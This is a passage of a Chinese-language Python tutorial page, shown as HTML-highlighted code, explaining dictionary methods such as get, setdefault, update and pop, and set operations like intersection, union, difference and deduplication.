class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基本操作</span></span><br><span class="line">info = [</span><br><span class="line">    [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;kinght&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;age&#x27;</span>,<span class="number">22</span>],</span><br><span class="line">    [<span class="string">&#x27;gender&#x27;</span>,<span class="string">&#x27;male&#x27;</span>]</span><br><span class="line">]</span><br><span class="line">d = &#123;&#125; <span class="comment"># 创建字典</span></span><br><span class="line"><span class="comment"># 注意:字典是无序的，没有序号的</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> info:</span><br><span class="line">    d[item[<span class="number">0</span>]]=item[<span class="number">1</span>] <span class="comment"># item[0]为key item[1]为value</span></span><br><span class="line">print(d) <span class="comment"># &#123;&#x27;name&#x27;: &#x27;kinght&#x27;, &#x27;age&#x27;: 22, &#x27;gender&#x27;: &#x27;male&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python 的 for循环的妙用</span></span><br><span class="line">info = [</span><br><span class="line">    [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;kinght&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;age&#x27;</span>,<span class="number">22</span>],</span><br><span class="line">    [<span class="string">&#x27;gender&#x27;</span>,<span class="string">&#x27;male&#x27;</span>]</span><br><span class="line">]</span><br><span class="line">d=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> a,b <span class="keyword">in</span> info: <span class="comment"># for in 循环可以在嵌套列表中，同时提取嵌套列表的多个元素</span></span><br><span class="line">    d[a] = b</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python的dict类型转换</span></span><br><span class="line">info = [</span><br><span class="line">    [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;kinght&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;age&#x27;</span>,<span class="number">22</span>],</span><br><span class="line">    [<span class="string">&#x27;gender&#x27;</span>,<span class="string">&#x27;male&#x27;</span>]</span><br><span class="line">]</span><br><span class="line">res = dict(info) <span class="comment"># 一行代码搞定上面for循环的工作</span></span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 两个列表快速造空字典(又称为快速初始化字典)</span></span><br><span class="line"><span class="comment">## None作为初始值</span></span><br><span class="line">keys = [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;gender&#x27;</span>]</span><br><span class="line"><span class="comment"># 方法一：循环法</span></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> keys:</span><br><span class="line">    d[a] = <span class="literal">None</span></span><br><span class="line">print(d)</span><br><span class="line"><span class="comment"># 方法二：</span></span><br><span class="line">d1 = &#123;&#125;.fromkeys(keys,<span class="literal">None</span>)</span><br><span class="line">print(d1)</span><br></pre></td></tr></table></figure><h2 id="内置方法-2"><a href="#内置方法-2" class="headerlink" title="内置方法"></a>内置方法</h2><h3 id="根据key存取值：可存可取"><a href="#根据key存取值：可存可取" class="headerlink" title="根据key存取值：可存可取"></a>根据key存取值：可存可取</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字典的取值是根据key取value值</span></span><br><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">111</span>&#125;</span><br><span class="line">print(d[<span class="string">&#x27;k1&#x27;</span>]) <span class="comment"># 111</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 赋值操作</span></span><br><span class="line"><span class="comment">## key存在，修改key对应value值</span></span><br><span class="line">d[<span class="string">&#x27;k1&#x27;</span>] = <span class="number">222</span></span><br><span class="line">print(d[<span class="string">&#x27;k1&#x27;</span>]) <span class="comment"># 222</span></span><br><span class="line"><span class="comment">## key不存在，则追加创建新值</span></span><br><span class="line">d[<span class="string">&#x27;k2&#x27;</span>] = <span class="number">333</span></span><br><span class="line">print(d) <span class="comment"># &#123;&#x27;k1&#x27;: 222, &#x27;k2&#x27;: 333&#125;</span></span><br></pre></td></tr></table></figure><h3 id="统计长度-1"><a href="#统计长度-1" class="headerlink" title="统计长度"></a>统计长度</h3><p>统计的是<code>key:value</code>的个数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">111</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">222</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">333</span>,<span class="string">&#x27;k1&#x27;</span>:<span class="number">333</span>&#125;</span><br><span class="line"><span class="comment"># 出现了相同key值，后面会把前面的key覆盖</span></span><br><span class="line">print(d) <span class="comment"># &#123;&#x27;k1&#x27;: 333, &#x27;k2&#x27;: 222, &#x27;k3&#x27;: 333&#125;</span></span><br><span class="line">print(len(d)) <span class="comment"># 3</span></span><br></pre></td></tr></table></figure><h3 id="成员运算-in和not-in"><a href="#成员运算-in和not-in" class="headerlink" title="成员运算 in和not in"></a>成员运算 in和not in</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">111</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">222</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">333</span>,<span class="string">&#x27;k1&#x27;</span>:<span class="number">333</span>&#125;</span><br><span class="line"><span class="comment"># 成员运算是根据key来算</span></span><br><span class="line">print(<span class="string">&#x27;k2&#x27;</span> <span class="keyword">in</span> d) <span class="comment"># True</span></span><br><span class="line">print(<span class="number">111</span> <span class="keyword">in</span> d) <span class="comment"># False</span></span><br></pre></td></tr></table></figure><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">111</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">222</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">333</span>,<span class="string">&#x27;k4&#x27;</span>:<span class="number">444</span>&#125;</span><br><span class="line"><span class="comment"># 通用的删除方法</span></span><br><span class="line"><span class="keyword">del</span> d[<span class="string">&#x27;k1&#x27;</span>]</span><br><span class="line">print(d) <span class="comment"># &#123;&#x27;k2&#x27;: 222, &#x27;k3&#x27;: 333, &#x27;k4&#x27;: 444&#125;</span></span><br><span class="line"><span class="comment"># pop删除：根据key删除元素</span></span><br><span class="line">res = d.pop(<span class="string">&#x27;k2&#x27;</span>)</span><br><span class="line">print(res) <span class="comment"># 222 pop有返回值，返回被删除key对应的value值</span></span><br><span class="line">print(d) <span class="comment"># &#123;&#x27;k3&#x27;: 333, &#x27;k4&#x27;: 444&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># popitem删除：随机删除一个值,返回一个元组，内容刚刚被删除的key:value</span></span><br><span class="line">res = d.popitem() <span class="comment"># 不带参数</span></span><br><span class="line">print(res) <span class="comment"># (&#x27;k4&#x27;, 444)</span></span><br><span class="line">print(d) <span class="comment"># &#123;&#x27;k3&#x27;: 333&#125;</span></span><br></pre></td></tr></table></figure><h3 id="键keys-、值values-、键值对items"><a href="#键keys-、值values-、键值对items" class="headerlink" title="键keys()、值values()、键值对items()"></a>键keys()、值values()、键值对items()</h3><p>在python2中演示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">111</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">222</span>&#125;</span><br><span class="line"><span class="comment"># 键keys()</span></span><br><span class="line">print(d.keys()) <span class="comment"># [&#x27;k2&#x27;, &#x27;k1&#x27;]</span></span><br><span class="line"><span class="comment"># 值values()</span></span><br><span class="line">print(d.values()) <span class="comment"># [222, 111]</span></span><br><span class="line"><span class="comment"># 键值对items()</span></span><br><span class="line">print(d.items()) <span class="comment"># [(&#x27;k2&#x27;, 222), (&#x27;k1&#x27;, 111)] 键值对：将key:value放入元组中(key,value)</span></span><br></pre></td></tr></table></figure><p>如果这个字典有一万个键值对，<code>keys/values/items</code>都会产生一个新的列表分别是<code>字典的key/字典的values/字典的键值对</code>，这样创建非常浪费内存空间</p><p>在pytho3都被优化了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">111</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">222</span>&#125;</span><br><span class="line"><span class="comment"># 键keys()</span></span><br><span class="line">print(d.keys()) <span class="comment"># dict_keys([&#x27;k1&#x27;, &#x27;k2&#x27;])</span></span><br><span class="line"><span class="comment">## 循环取值</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d.keys():</span><br><span class="line">    print(k) <span class="comment"># 有点鸡肋，不加.keys也是默认去keys</span></span><br><span class="line"><span class="comment">## 像python2一样取值 使用list</span></span><br><span class="line">print(list(d.keys())) <span class="comment"># [&#x27;k1&#x27;, &#x27;k2&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 值values()</span></span><br><span class="line">print(d.values()) <span class="comment"># dict_values([111, 222])</span></span><br><span class="line"><span class="comment">## 循环取值</span></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> d.values():</span><br><span class="line">    print(v) <span class="comment"># 取values()</span></span><br><span class="line"><span class="comment">## 像python2一样取值 使用list</span></span><br><span class="line">print(list(d.values())) <span class="comment"># [111, 222]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 键值对items()</span></span><br><span class="line">print(d.items()) <span class="comment"># dict_items([(&#x27;k1&#x27;, 111), (&#x27;k2&#x27;, 222)])</span></span><br><span class="line"><span class="comment">## 循环取值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d.items():</span><br><span class="line">    print(i) <span class="comment"># 取键值对</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> d.items():</span><br><span class="line">    print(k,v) <span class="comment"># 同时取key和value</span></span><br><span class="line"><span class="comment">## 像python2一样取值 使用list</span></span><br><span class="line">print(list(d.items())) <span class="comment"># [(&#x27;k1&#x27;, 111), (&#x27;k2&#x27;, 222)]</span></span><br></pre></td></tr></table></figure><h3 id="更新字典、get取值、设置默认值"><a href="#更新字典、get取值、设置默认值" class="headerlink" title="更新字典、get取值、设置默认值"></a>更新字典、get取值、设置默认值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">111</span>&#125;</span><br><span class="line">d.clear()</span><br><span class="line">print(d) <span class="comment"># 清空字典</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># d.update 更新字典 - 以新字典为准，添加不存在的，修改已存在的</span></span><br><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">111</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">222</span>&#125;</span><br><span class="line">d.update(&#123;<span class="string">&#x27;k2&#x27;</span>:<span class="number">333</span>,<span class="string">&#x27;k3&#x27;</span>:<span class="number">444</span>&#125;)</span><br><span class="line">print(d) <span class="comment"># &#123;&#x27;k1&#x27;: 111, &#x27;k2&#x27;: 333, &#x27;k3&#x27;: 444&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># d.get 根据key取值 - key不存在返回None</span></span><br><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">111</span>&#125;</span><br><span class="line"><span class="comment"># print(d[&#x27;k2&#x27;]) # KeyError: &#x27;k2&#x27; 直接取值不存在会报错</span></span><br><span class="line">print(d.get(<span class="string">&#x27;k2&#x27;</span>)) <span class="comment"># None 为了增加程序容错，不会因为不存在程序直接就崩溃</span></span><br><span class="line"><span class="comment">## d.get可以设置key不存在的时候的返回值</span></span><br><span class="line">res = d.get(<span class="string">&#x27;k2&#x27;</span>,<span class="string">&quot;值不存在&quot;</span>)</span><br><span class="line">print(res) <span class="comment"># 值不存在</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># d.setdefault() 设置默认值 - 有则不管，没有则赋予默认值</span></span><br><span class="line"><span class="comment">## 有返回值，返回字典key对应的值</span></span><br><span class="line">d = &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">111</span>&#125;</span><br><span class="line">d.setdefault(<span class="string">&#x27;k1&#x27;</span>,<span class="number">222</span>)</span><br><span class="line"><span class="comment">## 不是赋值</span></span><br><span class="line">print(d) <span class="comment"># &#123;&#x27;k1&#x27;: 111&#125; 发现没有修改</span></span><br><span class="line"><span class="comment">## 实现有则不管，没有则赋予默认值</span></span><br><span class="line"><span class="comment">### 实现方案1</span></span><br><span class="line">info = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;kinght&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> info <span class="keyword">and</span> <span class="string">&#x27;sex&#x27;</span> <span class="keyword">in</span> info:</span><br><span class="line">    <span class="keyword">pass</span> <span class="comment"># pass为跳过的含义，在python3中还可以是用...</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    info[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;demo&#x27;</span></span><br><span class="line">    info[<span class="string">&#x27;sex&#x27;</span>] = <span class="string">&#x27;male&#x27;</span></span><br><span class="line">print(info) <span class="comment"># &#123;&#x27;name&#x27;: &#x27;kinght&#x27;, &#x27;age&#x27;: 18, &#x27;sex&#x27;: &#x27;male&#x27;&#125;</span></span><br><span class="line"><span class="comment">### 实现方案2</span></span><br><span class="line">info = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;kinght&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br><span class="line">info.setdefault(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;demo&#x27;</span>)</span><br><span class="line">res = info.setdefault(<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;male&#x27;</span>) <span class="comment"># setdefault有返回值，返回字典key对应的值</span></span><br><span class="line">print(info) <span class="comment"># &#123;&#x27;name&#x27;: &#x27;kinght&#x27;, &#x27;age&#x27;: 18, &#x27;sex&#x27;: &#x27;male&#x27;&#125;</span></span><br><span class="line">print(res) <span class="comment"># male</span></span><br></pre></td></tr></table></figure><hr><h1 id="集合类型"><a href="#集合类型" class="headerlink" title="集合类型"></a>集合类型</h1><p>集合也是存放多个值，但并不是为了取单个值使用，而是将所有值集合在一起做关系运算和去重</p><p>案例：取两个人的共同好友</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用列表的方法</span></span><br><span class="line">frinds1 = [<span class="string">&quot;zero&quot;</span>,<span class="string">&quot;kevin&quot;</span>,<span class="string">&quot;jason&quot;</span>,<span class="string">&quot;egon&quot;</span>]</span><br><span class="line">frinds2 = [<span class="string">&quot;Jy&quot;</span>,<span class="string">&quot;ricky&quot;</span>,<span class="string">&quot;jason&quot;</span>,<span class="string">&quot;egon&quot;</span>]</span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> frinds1:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> frinds2:</span><br><span class="line">        l.append(i)</span><br><span class="line">print(l)</span><br></pre></td></tr></table></figure><p>这种情况就非常适合用集合</p><h2 id="定义-6"><a href="#定义-6" class="headerlink" title="定义"></a>定义</h2><p>在<code>&#123;&#125;</code>内用逗号分隔开多个元素，多个元素满足以下三个条件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># print(&#123;1,[1,2]&#125;) # 报错 - 集合内元素必须为不可变类型</span></span><br><span class="line">print(&#123;<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">21</span>&#125;) <span class="comment"># &#123;1, 2, 3, &#x27;a&#x27;, 21&#125; - 集合内元素无序</span></span><br><span class="line">print(&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>&#125;) <span class="comment"># &#123;1, 2, 3&#125; - 集合内元素不能重复,重复会自动去重</span></span><br></pre></td></tr></table></figure><p>由于<code>&#123;&#125;</code>是集合与字典通用的符号，<code>&#123;&#125;</code>为空时，默认为空字典，若调用空集合需要调用set功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认为空字典</span></span><br><span class="line">print(type(&#123;&#125;)) <span class="comment"># &lt;class &#x27;dict&#x27;&gt;</span></span><br><span class="line"><span class="comment"># 定义空集合</span></span><br><span class="line">s = set()</span><br><span class="line">print(type(s)) <span class="comment"># &lt;class &#x27;set&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="类型转换-6"><a href="#类型转换-6" class="headerlink" title="类型转换"></a>类型转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 由于集合无序且不能重复，所以转换后结果顺序不确定，且无重复元素</span></span><br><span class="line">s = set(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">print(s) <span class="comment"># &#123;&#x27;h&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;e&#x27;&#125;</span></span><br><span class="line">l = set([<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>])</span><br><span class="line">print(l) <span class="comment"># &#123;1&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果包含可变类型会报错</span></span><br><span class="line"><span class="comment">## 列表转换成集合只会转换第一层，第二层还是列表，而集合不能包含可变列表，所以会报错</span></span><br><span class="line"><span class="comment"># l2 = set([123,111,[111]]) # 会报错</span></span><br><span class="line"><span class="comment"># print(l2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典转换为集合，同样只取key值</span></span><br><span class="line">d = set(&#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">111</span>,<span class="string">&#x27;k2&#x27;</span>:<span class="number">222</span>&#125;)</span><br><span class="line">print(d) <span class="comment"># &#123;&#x27;k2&#x27;, &#x27;k1&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="内置方法-3"><a href="#内置方法-3" class="headerlink" title="内置方法"></a>内置方法</h2><p>集合大部分的内置方法都是围绕关系运算去做的，而关系运算最倾向于使用符号做</p><h3 id="关系运算"><a href="#关系运算" class="headerlink" title="关系运算"></a>关系运算</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义时候的案例</span></span><br><span class="line">frinds1 = &#123;<span class="string">&quot;zero&quot;</span>,<span class="string">&quot;kevin&quot;</span>,<span class="string">&quot;jason&quot;</span>,<span class="string">&quot;egon&quot;</span>&#125;</span><br><span class="line">frinds2 = &#123;<span class="string">&quot;Jy&quot;</span>,<span class="string">&quot;ricky&quot;</span>,<span class="string">&quot;jason&quot;</span>,<span class="string">&quot;egon&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取交集 - 两者共同的好友</span></span><br><span class="line">res = frinds1 &amp; frinds2</span><br><span class="line">print(res) <span class="comment"># &#123;&#x27;jason&#x27;, &#x27;egon&#x27;&#125;</span></span><br><span class="line"><span class="comment">## 使用内置函数求交际</span></span><br><span class="line">res = frinds1.intersection(frinds2)</span><br><span class="line">print(res) <span class="comment"># &#123;&#x27;jason&#x27;, &#x27;egon&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取并集 - 两者所有的好友</span></span><br><span class="line">res = frinds1 | frinds2</span><br><span class="line">print(res) <span class="comment"># &#123;&#x27;Jy&#x27;, &#x27;egon&#x27;, &#x27;kevin&#x27;, &#x27;zero&#x27;, &#x27;ricky&#x27;, &#x27;jason&#x27;&#125;</span></span><br><span class="line"><span class="comment">## 使用内置函数求并集</span></span><br><span class="line">res = frinds1.union(frinds2)</span><br><span class="line">print(res) <span class="comment"># &#123;&#x27;zero&#x27;, &#x27;kevin&#x27;, &#x27;egon&#x27;, &#x27;Jy&#x27;, &#x27;ricky&#x27;, &#x27;jason&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取差集 - friends1独有的好友</span></span><br><span class="line">res = frinds1 - frinds2</span><br><span class="line">print(res) <span class="comment"># &#123;&#x27;zero&#x27;, &#x27;kevin&#x27;&#125;</span></span><br><span class="line"><span class="comment">## 使用内置函数求差集</span></span><br><span class="line">res = frinds1.difference(frinds2)</span><br><span class="line">print(res) <span class="comment"># &#123;&#x27;zero&#x27;, &#x27;kevin&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对称差集 - friend1和frend2独有的好友(除去共同好友部分)</span></span><br><span class="line"><span class="comment">## 方案1</span></span><br><span class="line">res = (frinds1 - frinds2) | (frinds2 - frinds1)</span><br><span class="line">print(res) <span class="comment"># &#123;&#x27;Jy&#x27;, &#x27;zero&#x27;, &#x27;kevin&#x27;, &#x27;ricky&#x27;&#125;</span></span><br><span class="line"><span class="comment">## 方案2 ： 推荐</span></span><br><span class="line">res = frinds1 ^ frinds2</span><br><span class="line">print(res) <span class="comment"># &#123;&#x27;kevin&#x27;, &#x27;ricky&#x27;, &#x27;zero&#x27;, &#x27;Jy&#x27;&#125; - 顺序有变化</span></span><br><span class="line"><span class="comment">## 使用内置函数求对称差集</span></span><br><span class="line">res = frinds1.symmetric_difference(frinds2)</span><br><span class="line">print(res) <span class="comment"># &#123;&#x27;zero&#x27;, &#x27;ricky&#x27;, &#x27;kevin&#x27;, &#x27;Jy&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 父子集 : 包含的关系</span></span><br><span class="line"><span class="comment">## 外面的集合能够完整包含里面的元素(包括相等),才为父子集</span></span><br><span class="line">r1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line">r2 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">print(r1 &gt; r2) <span class="comment"># False</span></span><br><span class="line">print(r1 &lt; r2) <span class="comment"># False</span></span><br><span class="line"><span class="comment">## 一个完全包含另一个才为父子集</span></span><br><span class="line">r1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line">r2 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>&#125;</span><br><span class="line">r3 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>&#125;</span><br><span class="line">print(r1 &gt; r2) <span class="comment"># True</span></span><br><span class="line">print(r1 == r2) <span class="comment"># True 他们相互等于互为父子集</span></span><br><span class="line"><span class="comment">## 使用内置函数比大小</span></span><br><span class="line">print(r1.issuperset(r2)) <span class="comment"># True 等同于r1 包含 r2</span></span><br><span class="line">print(r2.issubset(r1)) <span class="comment"># True r2 被 r1 包含</span></span><br><span class="line">print(r3.issuperset(r2)) <span class="comment"># True r3 包含 r2 他们互相为父子</span></span><br></pre></td></tr></table></figure><h3 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 集合的去重有局限性</span></span><br><span class="line"><span class="comment">## 1.只能针对不可变类型去重</span></span><br><span class="line">print(set([<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>])) <span class="comment"># &#123;1, 2&#125; set转集合</span></span><br><span class="line"><span class="comment">## 2.无法保证原来的顺序</span></span><br><span class="line">l = [<span class="number">1</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">3</span>,<span class="string">&#x27;aaa&#x27;</span>]</span><br><span class="line">print(set(l)) <span class="comment"># 